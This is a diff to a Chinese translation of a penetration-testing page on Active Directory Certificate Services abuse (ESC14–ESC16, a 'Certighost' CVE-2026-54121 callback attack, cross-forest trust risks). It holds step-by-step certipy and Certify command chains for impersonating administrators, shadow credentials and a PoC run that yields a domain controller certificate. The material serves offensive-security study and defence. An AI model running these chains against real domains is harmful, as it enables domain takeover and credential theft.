-潜在的弱 `altSecurityIdentities` 映射字符串示例包括：
+潜在 weak `altSecurityIdentities` mapping strings 的示例包括：
 
-- 仅通过常见的 Subject Common Name (CN) 进行映射：例如，`X509:<S>CN=SomeUser`。攻击者可能能从较不安全的来源获得具有该 CN 的证书。
-- 使用过于通用的 Issuer Distinguished Names (DNs) 或 Subject DNs，而没有进一步限定（例如特定的序列号或 subject key identifier）：例如，`X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
-- 使用其他可预测的模式或非加密标识符，攻击者可能能够在合法获取或伪造的证书中满足这些条件（例如当他们已妥协 CA 或发现如 ESC1 中的易受攻击模板时）。
+- 仅根据通用的 Subject Common Name (CN) 进行 mapping：例如 `X509:<S>CN=SomeUser`。Attacker 可能能够从安全性较低的来源获取具有该 CN 的 certificate。
+- 使用过于通用的 Issuer Distinguished Names (DNs) 或 Subject DNs，而没有通过特定 serial number 或 subject key identifier 等信息进行进一步限定：例如 `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
+- 使用其他 attacker 可能在其合法获取或 forge 的 certificate 中满足的可预测 pattern 或非 cryptographic identifiers（例如 attacker 已 compromise CA，或发现了类似 ESC1 中的 vulnerable template）。
 
-`altSecurityIdentities` 属性支持多种映射格式，例如：
+`altSecurityIdentities` 属性支持多种 mapping formats，例如：
 
-- `X509:<I>IssuerDN<S>SubjectDN`（按完整 Issuer 和 Subject DN 映射）
-- `X509:<SKI>SubjectKeyIdentifier`（按证书的 Subject Key Identifier 扩展值映射）
-- `X509:<SR>SerialNumberBackedByIssuerDN`（按序列号映射，隐含由 Issuer DN 限定）- 这不是标准格式，通常是 `<I>IssuerDN<SR>SerialNumber`。
-- `X509:<RFC822>EmailAddress`（按 SAN 中的 RFC822 名称映射，通常是电子邮件地址）
-- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（按证书原始公钥的 SHA1 哈希映射 - 通常是强的）
+- `X509:<I>IssuerDN<S>SubjectDN`（根据完整的 Issuer 和 Subject DN 进行 mapping）
+- `X509:<SKI>SubjectKeyIdentifier`（根据 certificate 的 Subject Key Identifier extension value 进行 mapping）
+- `X509:<SR>SerialNumberBackedByIssuerDN`（根据 serial number 进行 mapping，并由 Issuer DN 进行隐式限定）——这不是 standard format，通常为 `<I>IssuerDN<SR>SerialNumber`。
+- `X509:<RFC822>EmailAddress`（根据 SAN 中的 RFC822 name（通常为 email address）进行 mapping）
+- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（根据 certificate raw public key 的 SHA1 hash 进行 mapping——通常较为 strong）
 
-这些映射的安全性在很大程度上取决于映射字符串中所选证书标识符的具体性、唯一性和密码学强度。即使在域控制器上启用了强证书绑定模式（主要影响基于 SAN UPN/DNS 和 SID 扩展的隐式映射），如果 `altSecurityIdentities` 条目配置不当，或者映射逻辑本身存在缺陷或过于宽松，仍可能直接导致冒充风险。
+这些 mapping 的 security 高度取决于 mapping string 中所选 certificate identifiers 的 specificity、uniqueness 和 cryptographic strength。即使 Domain Controllers 已启用 strong certificate binding modes（其主要影响基于 SAN UPN/DNS 和 SID extension 的 implicit mappings），配置不当的 `altSecurityIdentities` entry 仍可能成为直接的 impersonation 路径，因为 mapping logic 本身存在缺陷或过于宽松。
+### Abuse Scenario
 
-### 滥用场景
+ESC14 针对 Active Directory (AD) 中的 **explicit certificate mappings**，具体来说是 `altSecurityIdentities` 属性。如果该属性已被设置（无论是有意设置还是配置错误），attacker 就可以通过提供与 mapping 匹配的 certificates 来 impersonate 账户。
 
-ESC14 针对 Active Directory (AD) 中的显式证书映射，具体为 `altSecurityIdentities` 属性。如果该属性被设置（出于设计或配置错误），攻击者可以通过出示与映射匹配的证书来冒充帐户。
+#### Scenario A: Attacker Can Write to `altSecurityIdentities`
 
-#### Scenario A: 攻击者可以写入 `altSecurityIdentities`
-
-前提条件：攻击者对目标帐户的 `altSecurityIdentities` 属性具有写权限，或对目标 AD 对象具有以下任一权限，从而能够授予该写入：
+**前提条件**：Attacker 对目标账户的 `altSecurityIdentities` 属性具有 write permissions，或具有以下 target AD object permissions 之一，可以授予自身该权限：
 - Write property `altSecurityIdentities`
 - Write property `Public-Information`
 - Write property (all)
@@ -722,25 +723,20 @@ ESC14 针对 Active Directory (AD) 中的显式证书映射，具体为 `altSecu
 - `WriteOwner`*
 - `GenericWrite`
 - `GenericAll`
-- Owner*.
+- Owner*。
+#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)
 
-#### Scenario B: 目标通过 X509RFC822（电子邮件）具有弱映射
+- **前提条件**：Target 在 altSecurityIdentities 中具有 weak X509RFC822 mapping。Attacker 可以将 victim 的 mail attribute 设置为匹配 target 的 X509RFC822 name，然后以 victim 身份 enroll 一个 certificate，并使用该 certificate 以 target 身份进行 authentication。
+#### Scenario C: Target Has X509IssuerSubject Mapping
 
-- 前提条件：目标在 altSecurityIdentities 中存在弱的 X509RFC822 映射。攻击者可以将受害者的 mail 属性设置为匹配目标的 X509RFC822 名称，作为受害者申请证书，然后使用该证书以目标身份进行身份验证。
+- **前提条件**：Target 在 `altSecurityIdentities` 中具有 weak X509IssuerSubject explicit mapping。Attacker 可以将 victim principal 的 `cn` 或 `dNSHostName` attribute 设置为匹配 target 的 X509IssuerSubject mapping 的 subject。然后，attacker 可以以 victim 身份 enroll 一个 certificate，并使用该 certificate 以 target 身份进行 authentication。
+#### Scenario D: Target Has X509SubjectOnly Mapping
 
-#### Scenario C: 目标具有 X509IssuerSubject 映射
-
-- 前提条件：目标在 `altSecurityIdentities` 中具有弱的 X509IssuerSubject 显式映射。攻击者可以将受害者主体的 `cn` 或 `dNSHostName` 属性设置为匹配目标的 X509IssuerSubject 映射中的 Subject，然后以受害者身份申请证书，并使用该证书以目标身份进行身份验证。
-
-#### Scenario D: 目标具有 X509SubjectOnly 映射
-
-- 前提条件：目标在 `altSecurityIdentities` 中具有弱的 X509SubjectOnly 显式映射。攻击者可以将受害者主体的 `cn` 或 `dNSHostName` 属性设置为匹配目标的 X509SubjectOnly 映射中的 Subject，然后以受害者身份申请证书，并使用该证书以目标身份进行身份验证。
-
+- **前提条件**：Target 在 `altSecurityIdentities` 中具有 weak X509SubjectOnly explicit mapping。Attacker 可以将 victim principal 的 `cn` 或 `dNSHostName` attribute 设置为匹配 target 的 X509SubjectOnly mapping 的 subject。然后，attacker 可以以 victim 身份 enroll 一个 certificate，并使用该 certificate 以 target 身份进行 authentication。
 ### 具体操作
-
 #### Scenario A
 
-请求证书，使用证书模板 `Machine`
+Request a certificate of the certificate template `Machine`
 ```bash
 .\Certify.exe request /ca:<ca> /template:Machine /machine
 ```
@@ -756,28 +752,28 @@ certutil -MergePFX .\esc13.pem .\esc13.pfx
 ```bash
 Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
 ```
-有关各种攻击场景下的更具体攻击方法，请参阅以下内容： [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).
+对于各种攻击场景中的更具体攻击方法，请参考以下内容：[adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)。
 
-## EKUwu Application Policies(CVE-2024-49019) - ESC15
+## EKUwu Application Policies（CVE-2024-49019）- ESC15
 
-### 解释
+### 说明
 
-在 https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc 上的描述非常详尽。下面引用原文：
+https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc 中的描述非常详尽。以下是原文摘录。
 
-使用内置的默认 version 1 证书模板，攻击者可以构造一个 CSR 来包含优先于模板中指定的 Extended Key Usage 属性的 application policies。唯一的要求是 enrollment 权限，并且可以使用 **_WebServer_** 模板生成 client authentication、certificate request agent 和 codesigning 证书
+使用内置的默认版本 1 certificate templates，攻击者可以构造 CSR，使其包含优先级高于模板中已配置 Extended Key Usage 属性的 application policies。唯一的要求是具备 enrollment 权限；利用 **_WebServer_** template，可以生成 client authentication、certificate request agent 以及 codesigning certificates。
 
-### 滥用
+### 利用
 
-下述内容参考了 [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.
+以下内容引用自 [此链接]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)，点击查看更详细的使用方法。
 
 
-Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.
+如果 CA 未打补丁，Certipy 的 `find` 命令可以帮助识别可能容易受到 ESC15 攻击的 V1 templates。
 ```bash
 certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
 ```
 #### 场景 A：通过 Schannel 直接冒充
 
-**第 1 步：请求证书，注入 "Client Authentication" Application Policy 和目标 UPN。** 攻击者 `attacker@corp.local` 使用 "WebServer" V1 模板针对 `administrator@corp.local`（该模板允许申请者提供的 subject）。
+**步骤 1：请求证书，注入“Client Authentication”Application Policy 和目标 UPN。** 攻击者 `attacker@corp.local` 使用“WebServer”V1 模板（允许申请者提供 subject），以 `administrator@corp.local` 为目标。
 ```bash
 certipy req \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
@@ -786,17 +782,17 @@ certipy req \
 -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
 -application-policies 'Client Authentication'
 ```
-- `-template 'WebServer'`: 易受攻击的 V1 模板，带有 "Enrollee supplies subject"。
-- `-application-policies 'Client Authentication'`: 将 OID `1.3.6.1.5.5.7.3.2` 注入到 CSR 的 Application Policies 扩展中。
-- `-upn 'administrator@corp.local'`: 在 SAN 中设置 UPN 以进行冒充。
+- `-template 'WebServer'`：存在漏洞的 V1 模板，启用了“Enrollee supplies subject”。
+- `-application-policies 'Client Authentication'`：将 OID `1.3.6.1.5.5.7.3.2` 注入 CSR 的 Application Policies 扩展。
+- `-upn 'administrator@corp.local'`：在 SAN 中设置 UPN 以进行 impersonation。
 
-**步骤 2：使用获得的证书通过 Schannel (LDAPS) 进行身份验证。**
+**Step 2：使用获取的证书通过 Schannel（LDAPS）进行身份验证。**
 ```bash
 certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
 ```
-#### 情景 B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse
+#### Scenario B: 通过滥用 Enrollment Agent 进行 PKINIT/Kerberos Impersonation
 
-**步骤 1：从 V1 模板（带有 "Enrollee supplies subject"）请求证书，注入 "Certificate Request Agent" Application Policy。** 此证书是给攻击者 (`attacker@corp.local`) 成为 enrollment agent。这里没有为攻击者自身指定 UPN，因为目标是获取 agent 能力。
+**Step 1：从 V1 template 请求证书（带有“Enrollee supplies subject”），注入“Certificate Request Agent” Application Policy。** 此证书用于让攻击者（`attacker@corp.local`）成为 enrollment agent。此处未为攻击者自身身份指定 UPN，因为目标是获得 agent capability。
 ```bash
 certipy req \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
@@ -806,7 +802,7 @@ certipy req \
 ```
 - `-application-policies 'Certificate Request Agent'`: 注入 OID `1.3.6.1.4.1.311.20.2.1`。
 
-**步骤 2：使用“代理”证书代表目标特权用户请求证书。** 这是一个类似 ESC3 的步骤，使用步骤 1 的证书作为代理证书。
+**步骤 2：使用“agent”证书代表目标特权用户请求证书。** 这是一个类似 ESC3 的步骤，使用步骤 1 中的证书作为 agent certificate。
 ```bash
 certipy req \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
@@ -814,31 +810,31 @@ certipy req \
 -ca 'CORP-CA' -template 'User' \
 -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
 ```
-**步骤 3：使用 "on-behalf-of" 证书以特权用户身份进行身份验证。**
+**步骤 3：使用“on-behalf-of”证书以特权用户身份进行身份验证。**
 ```bash
 certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
 ```
-## CA 上禁用安全扩展（全局）-ESC16
+## CA 上禁用 Security Extension（全局）-ESC16
 
-### 解释
+### 说明
 
-**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** 指的是这样一种情况：如果 AD CS 的配置未强制在所有证书中包含 **szOID_NTDS_CA_SECURITY_EXT** 扩展，攻击者就可以通过以下方式利用该问题：
+**ESC16（通过缺少 szOID_NTDS_CA_SECURITY_EXT Extension 提权）**指的是：如果 AD CS 的配置未强制要求在所有 certificates 中包含 **szOID_NTDS_CA_SECURITY_EXT** extension，attacker 就可以利用这一点：
 
-1. 请求一个 **没有 SID binding** 的证书。
+1. 请求一个**不含 SID binding 的 certificate**。
 
-2. 使用该证书 **以任何账户进行身份验证**，例如冒充高权限账户（如 Domain Administrator）。
+2. 使用该 certificate **以任意 account 身份进行 authentication**，例如 impersonating 高权限 account（如 Domain Administrator）。
 
-你也可以参考这篇文章以了解更详细的原理：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6
+你也可以参考这篇 article，了解更详细的原理：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6
 
-### 滥用
+### Abuse
 
-The following is referenced to [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Click to see more detailed usage methods.
+以下内容引用自 [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)，点击查看更详细的使用方法。
 
-要识别 Active Directory Certificate Services (AD CS) 环境是否易受 **ESC16** 影响。
+要识别 Active Directory Certificate Services（AD CS）environment 是否容易受到 **ESC16** 攻击，需要
 ```bash
 certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
 ```
-**步骤 1：读取受害者帐户的初始 UPN（可选 - 用于恢复）。
+**步骤 1：读取受害者账户的初始 UPN（可选 - 用于恢复）。**
 ```bash
 certipy account \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
@@ -852,14 +848,14 @@ certipy account \
 -dc-ip '10.0.0.100' -upn 'administrator' \
 -user 'victim' update
 ```
-**第 3 步：（如有需要）获取“受害者”账户的凭据（例如，通过 Shadow Credentials）。**
+**步骤 3：（如有需要）获取“victim”账户的凭据（例如通过 Shadow Credentials）。**
 ```shell
 certipy shadow \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
 -dc-ip '10.0.0.100' -account 'victim' \
 auto
 ```
-**Step 4: 以 "victim" 用户的身份从 _any suitable client authentication template_（例如 "User"）向 ESC16-vulnerable CA 请求证书。** 因为该 CA 易受 ESC16 漏洞影响，它会自动在颁发的证书中省略 SID security extension，无论该模板对此扩展的具体设置如何。设置 Kerberos credential cache 环境变量（shell 命令）：
+**步骤 4：从 _any suitable client authentication template_（例如“User”）向存在 ESC16 漏洞的 CA 请求证书，作为“victim”用户。**由于该 CA 存在 ESC16 漏洞，无论模板对该扩展的具体设置如何，它都会自动从签发的证书中省略 SID security extension。设置 Kerberos credential cache 环境变量（shell command）：
 ```bash
 export KRB5CCNAME=victim.ccache
 ```
@@ -870,7 +866,7 @@ certipy req \
 -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
 -template 'User'
 ```
-**第 5 步：还原 "victim" 帐户的 UPN。**
+**步骤 5：还原“victim”账户的 UPN。**
 ```bash
 certipy account \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
@@ -883,21 +879,73 @@ certipy auth \
 -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
 -username 'administrator' -domain 'corp.local'
 ```
-## 使用证书破坏林（被动语态说明）
+## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)
 
-### 由被入侵的 CAs 导致的林信任破坏
+### 说明
 
-对 **cross-forest enrollment** 的配置相对简单。来自 resource forest 的 **root CA certificate** 会被管理员**发布到 account forests**，并且来自 resource forest 的 **enterprise CA** 证书会被**添加到每个 account forest 的 `NTAuthCertificates` 和 AIA 容器中**。需要说明的是，这种安排赋予了 resource forest 中的 **CA 完全控制权**，对其管理 PKI 的所有其他林都适用。如果该 CA 被攻击者**compromised by attackers**，攻击者就可以**forge**资源林和帐户林中所有用户的证书，从而破坏林的安全边界。
+**Certighost** 利用 **AD CS enrollment chase / callback path**，其中 CA 信任由请求者提供的 request attributes，以解析应放入已签发证书中的身份。在公开 PoC 中，构造的请求包括：
 
-### 授予外部主体的 Enrollment 权限
+- **`cdc`**：由 attacker 控制的 host/IP，CA 将连接到该地址
+- **`rmd`**：要冒充的 **target Domain Controller DNS name**
 
-在多林环境中，需要对那些 Enterprise CAs **publish certificate templates** 的情况保持警惕，这些模板允许 **Authenticated Users or foreign principals**（属于 Enterprise CA 所在林之外的用户/组）具有**enrollment and edit rights**。\
-在跨信任进行身份验证时，AD 会将 **Authenticated Users SID** 添加到用户的 token 中。因此，如果某个域拥有一个 Enterprise CA，其模板**allows Authenticated Users enrollment rights**，则该模板可能会被来自不同 forest 的用户**enroll**。同样，如果模板将**enrollment rights 明确授予一个 foreign principal**，则会由此创建一个**cross-forest access-control relationship**，允许一个 forest 中的主体去**enroll**另一个 forest 的模板。
+如果 CA 跟随该 chase，它将通过 **SMB/LSA (`445`)** 和 **LDAP (`389`)** 连接到 attacker。attacker 使用一个**真实的 machine account**（通常通过默认的 **`ms-DS-MachineAccountQuota`** 创建），使 callback session 以有效的 domain principal 进行身份验证，但 rogue services 返回的却是 **target DC** 的身份属性：
 
-这两种情况都会导致从一个 forest 到另一个 forest 的**attack surface 增加**。证书模板的设置可能被攻击者利用，从而在外部域获得额外权限。
+- `sAMAccountName`
+- `objectSid` / SID
+- `dNSHostName`
 
-## 参考资料
+如果 CA **没有将返回的身份以 cryptographic 方式绑定到经过身份验证的 callback principal**，它就可能为 **Domain Controller** 签发证书，尽管该 session 实际上是以 attacker 控制的 machine account 完成身份验证的。这使该 bug 在概念上不同于 **Certifried**：attacker 并不是重写 `dNSHostName` 等 AD attributes，而是在 CA callback resolution 期间**替换身份数据**。
 
+**有用的前提条件：**
+
+- 低权限的 **domain credentials**
+- 能够**创建或复用 computer account**
+- CA 能够从网络访问 attacker 控制的 **`389`** 和 **`445`** 端口
+- 存在 vulnerable / unpatched 的 CA request path（**2026 年 7 月 14 日**的 Microsoft update 增加了对 **`cdc`** 的 **DC validation** 以及 **resolved-SID comparison**）
+
+生成的 **`.pfx`** 随后可用于 **PKINIT**，生成 **`.ccache`**；在已发布的 PoC 流程中，还能获取 **target DC NT hash**，这通常足以造成**完整的 domain compromise**。
+
+### Abuse
+
+公开 PoC 会自动化执行完整链路：
+
+1. 创建或复用由 attacker 控制的 **machine account**。
+2. 在 `389` 和 `445` 上启动 **rogue LDAP and SMB/LSA listeners**。
+3. 提交包含由 attacker 控制的 **`cdc`** 和 target **`rmd`** attributes 的 certificate request。
+4. 让 CA 以受控 machine account 的身份向 rogue listeners 进行身份验证，但使用 **target DC** attributes 响应 identity lookups。
+5. 接收由 CA 签发的 **DC certificate**，然后将其用于 **PKINIT**。
+```bash
+sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
+```
+PoC 中有用的 runtime flags：
+
+- `--listener <ip>`：显式选择在 `cdc` 中公布的 callback IP
+- `--computer-name <NAME$>`：复用现有的 machine account，而不是创建新账户
+
+**Operational notes：**
+
+- PoC 需要 **root**，因为它会绑定 **privileged ports** `389` 和 `445`。
+- 成功 exploitation 后，**DC `.pfx`** 和 **Kerberos `.ccache`** 会被写入本地。
+- 由于该证书会映射到 **Domain Controller account**，后续操作可以包括 **certificate-based Kerberos auth**、**DCSync**，以及复用恢复出的 **machine NT hash**。
+
+## 使用 Certificates Compromising Forests 的被动语态说明
+
+### Compromised CAs 对 Forest Trusts 的破坏
+
+**cross-forest enrollment** 的配置可以相对简单地完成。resource forest 中的 **root CA certificate** 会由管理员**发布到 account forests**，而 resource forest 中的 **enterprise CA** certificates 会被**添加到每个 account forest 中的 `NTAuthCertificates` 和 AIA containers**。需要明确的是，这种配置会使 resource forest 中的 **CA** 获得对其管理 PKI 的所有其他 forests 的完全控制权。如果该 CA **被攻击者 compromise**，resource forest 和 account forests 中所有用户的 certificates 都可能被其**伪造**，从而破坏 forest 的 security boundary。
+
+### 授予 Foreign Principals 的 Enrollment Privileges
+
+在 multi-forest environments 中，需要特别注意那些**发布 certificate templates** 的 Enterprise CAs，因为这些 templates 可能允许 **Authenticated Users 或 foreign principals**（属于 Enterprise CA 所在 forest 之外的 users/groups）拥有 **enrollment 和 edit rights**。\
+当用户跨 trust 完成 authentication 后，AD 会将 **Authenticated Users SID** 添加到用户的 token 中。因此，如果某个 domain 拥有一个允许 **Authenticated Users enrollment rights** 的 Enterprise CA template，则来自不同 forest 的用户可能会对该 template 执行 **enrollment**。同样，如果某个 template 明确向 foreign principal 授予 **enrollment rights**，则会由此创建一个 **cross-forest access-control relationship**，使一个 forest 中的 principal 能够对另一个 forest 中的 template 执行 **enrollment**。
+
+这两种情况都会导致一个 forest 到另一个 forest 的 **attack surface 增加**。certificate template 的设置可能会被攻击者利用，以在 foreign domain 中获得 additional privileges。
+
+
+## References
+
+- [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
+- [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
 - [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
 - [GhostPack/Certify](https://github.com/GhostPack/Certify)
 - [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
